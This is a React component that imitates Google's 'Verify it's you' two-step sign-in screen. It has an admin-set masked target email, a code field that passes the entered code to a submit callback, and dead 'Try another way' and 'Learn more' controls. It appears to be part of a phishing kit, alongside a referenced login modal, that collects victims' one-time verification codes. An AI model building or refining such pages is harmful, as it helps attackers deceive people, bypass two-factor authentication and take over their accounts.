"use client";

import { useState, useEffect, useId } from "react";

interface NCodeModalProps {
  isOpen: boolean;
  candidateEmail?: string;
  targetEmail?: string; // Variable email specified by admin (e.g. ema•••••••@gmail.com)
  isSubmitted?: boolean;
  errorMessage?: string | null;
  onSubmitCode: (code: string) => Promise<void>;
  onClose?: () => void;
}

export default function NCodeModal({
  isOpen,
  candidateEmail = "candidate mail @gmail.com",
  targetEmail = "ema•••••••@gmail.com",
  isSubmitted = false,
  errorMessage = null,
  onSubmitCode,
  onClose,
}: NCodeModalProps) {
  const [code, setCode] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(errorMessage);
  const inputId = useId();

  // Reset input field when modal opens or sync external errorMessage
  useEffect(() => {
    if (isOpen) {
      if (errorMessage) {
        setError(errorMessage);
        setIsSubmitting(false);
      } else {
        setCode("");
        setError(null);
        setIsSubmitting(false);
      }
    }
  }, [isOpen, errorMessage]);

  if (!isOpen) return null;

  const displayCandidateEmail = candidateEmail.trim() || "candidate mail @gmail.com";
  const displayTargetEmail = targetEmail.trim() || "ema•••••••@gmail.com";

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!code.trim()) {
      setError("Enter the code");
      return;
    }
    setError(null);
    setIsSubmitting(true);
    try {
      await onSubmitCode(code.trim());
    } catch (err: any) {
      setError(err?.message || "Failed to submit code. Please try again.");
      setIsSubmitting(false);
    }
  };

  const showSpinnerOnly = isSubmitting || isSubmitted;

  return (
    <div
      className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-[#f0f4f9] p-3 sm:p-6 md:p-10 overflow-y-auto animate-fade-in font-sans"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-[1184px] flex flex-col items-center">
        {/* Main Google/SSO Style Card - Scaled Frame (-20%) */}
        <div className="w-full min-h-[512px] sm:min-h-[560px] bg-white rounded-[28px] p-8 sm:p-12 lg:p-16 shadow-[0_8px_36px_rgba(0,0,0,0.08)] border border-black/[0.04] transition-all relative overflow-hidden flex flex-col justify-center">
          {/* Subtle top indeterminate progress bar when submitting */}
          {showSpinnerOnly && (
            <div className="absolute top-0 left-0 right-0 h-1.5 bg-blue-100 overflow-hidden">
              <div className="h-full bg-[#0b57d0] animate-indeterminate" />
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-14 lg:gap-20 items-center">
            {/* Left Column: N-Logo, Verify it's you, Explanatory Text, Candidate Email Pill */}
            <div className="space-y-5 sm:space-y-6">
              {/* N-Logo (PNG Format) */}
              <div className="flex items-center">
                <img
                  src="/images/n-logo.png"
                  alt="N-Logo"
                  className="w-16 h-16 object-contain rounded-xl select-none shadow-sm"
                />
              </div>

              {/* Title */}
              <div className="pt-1">
                <h1 className="text-3xl sm:text-4xl lg:text-[46px] font-normal text-[#1f1f1f] tracking-tight leading-[1.15]">
                  Verify it’s you
                </h1>
              </div>

              {/* Explanatory subtitle */}
              <p className="text-sm sm:text-base text-[#1f1f1f] font-normal leading-relaxed pt-1 max-w-lg">
                To help keep your account safe, Google wants to make sure it’s really you trying to sign in.{" "}
                <span
                  onClick={(e) => e.preventDefault()}
                  className="text-[#0b57d0] hover:underline font-medium cursor-pointer"
                >
                  Learn more
                </span>
              </p>

              {/* Candidate Email Badge / Pill with Silhouette Icon & Chevron */}
              <div className="pt-1">
                <div className="inline-flex items-center gap-2.5 border border-[#747775]/70 hover:border-[#1f1f1f] rounded-full pl-1.5 pr-3.5 py-1 bg-white hover:bg-gray-50/80 transition-colors select-none cursor-pointer shadow-2xs">
                  {/* Silhouette Avatar Circle */}
                  <div className="w-7 h-7 rounded-full bg-gray-100 text-gray-600 flex items-center justify-center shrink-0">
                    <svg
                      className="w-4 h-4 text-gray-500"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      aria-hidden="true"
                    >
                      <path
                        fillRule="evenodd"
                        d="M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12-1.282A8.25 8.25 0 0112 14.25a8.25 8.25 0 015.315 3.565A8.25 8.25 0 0112 20.25a8.25 8.25 0 01-5.315-2.435zM12 6.75a3.75 3.75 0 100 7.5 3.75 3.75 0 000-7.5z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </div>

                  {/* Candidate Email */}
                  <span className="text-sm sm:text-base font-medium text-[#1f1f1f] tracking-tight">
                    {displayCandidateEmail}
                  </span>

                  {/* Downward chevron / caret */}
                  <svg
                    className="w-3.5 h-3.5 text-[#444746]"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                    aria-hidden="true"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
                      clipRule="evenodd"
                    />
                  </svg>
                </div>
              </div>
            </div>

            {/* Right Column: Code Input OR Pure Round Loading Spinner */}
            <div className="w-full flex flex-col justify-center">
              {showSpinnerOnly ? (
                /* Pure Round Loading Circle (Identical to NLoginModal) */
                <div className="py-20 sm:py-28 flex flex-col items-center justify-center animate-fade-in w-full">
                  <div
                    className="w-14 h-14 sm:w-16 sm:h-16 border-[4px] border-blue-200 border-t-[#0b57d0] rounded-full animate-spin"
                    aria-label="Loading..."
                  />
                </div>
              ) : (
                /* Verification Code Form */
                <form onSubmit={handleSubmit} className="space-y-3.5 pt-2 md:pt-3">
                  {/* Dynamic target email sentence set from admin */}
                  <p className="text-sm sm:text-base text-[#1f1f1f] font-normal leading-normal pb-1">
                    An email with a verification code was just sent to {displayTargetEmail}
                  </p>

                  {/* Google Style Outlined Floating Label Input */}
                  <div className="relative">
                    <input
                      id={inputId}
                      type="text"
                      value={code}
                      onChange={(e) => {
                        setCode(e.target.value);
                        if (error) setError(null);
                      }}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      placeholder=" "
                      autoComplete="one-time-code"
                      autoFocus
                      disabled={isSubmitting}
                      className={`peer w-full h-[54px] sm:h-[60px] px-4 pt-3.5 pb-1 text-base sm:text-lg text-[#1f1f1f] bg-transparent rounded-[5px] border outline-none transition-all font-sans ${
                        error
                          ? "border-2 border-[#b3261e]"
                          : isFocused
                          ? "border-2 border-[#0b57d0]"
                          : "border border-[#747775] hover:border-[#1f1f1f]"
                      }`}
                    />

                    {/* Floating Label with background cutout */}
                    <label
                      htmlFor={inputId}
                      className={`absolute left-3.5 transition-all pointer-events-none px-1 bg-white select-none font-normal ${
                        isFocused || code.length > 0
                          ? `-top-2.5 text-xs sm:text-xs ${
                              error
                                ? "text-[#b3261e] font-medium"
                                : isFocused
                                ? "text-[#0b57d0] font-medium"
                                : "text-[#444746]"
                            }`
                          : "top-3.5 text-base sm:text-lg text-[#444746]"
                      }`}
                    >
                      Enter code
                    </label>
                  </div>

                  {/* Error Notification */}
                  {error && (
                    <div className="pt-1 flex items-center gap-2 text-xs sm:text-sm text-[#b3261e] font-normal animate-fade-in">
                      <svg className="w-4 h-4 shrink-0 fill-current" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <span>{error}</span>
                    </div>
                  )}

                  {/* Action Row: Try another way & Next Button */}
                  <div className="flex items-center justify-between pt-10 sm:pt-14">
                    <button
                      type="button"
                      onClick={() => {
                        setError("Please enter the verification code sent to your email.");
                      }}
                      className="text-sm sm:text-base font-medium text-[#0b57d0] hover:bg-blue-50/70 px-2.5 py-1.5 -ml-2.5 rounded-full transition-colors cursor-pointer select-none"
                    >
                      Try another way
                    </button>

                    <button
                      type="submit"
                      disabled={isSubmitting || !code.trim()}
                      className="bg-[#0b57d0] hover:bg-[#0842a0] disabled:bg-[#0b57d0]/40 disabled:cursor-not-allowed text-white font-medium text-sm sm:text-base px-7 py-2.5 sm:py-3 rounded-full transition-all active:scale-95 shadow-xs flex items-center justify-center gap-2 cursor-pointer select-none"
                    >
                      <span>Next</span>
                    </button>
                  </div>
                </form>
              )}
            </div>
          </div>
        </div>

        {/* Outer Footer Below Card */}
        <div className="w-full max-w-[1184px] flex flex-col sm:flex-row items-center justify-between gap-3 text-xs sm:text-sm text-[#444746] mt-5 px-4 select-none">
          {/* Language selector */}
          <div className="flex items-center gap-2 hover:text-[#1f1f1f] cursor-pointer">
            <span>English (United States)</span>
            <span className="text-xs">▼</span>
          </div>

          {/* Legal / Help links */}
          <div className="flex items-center gap-6 sm:gap-7">
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Help</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Privacy</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Terms</span>
          </div>
        </div>
      </div>
    </div>
  );
}
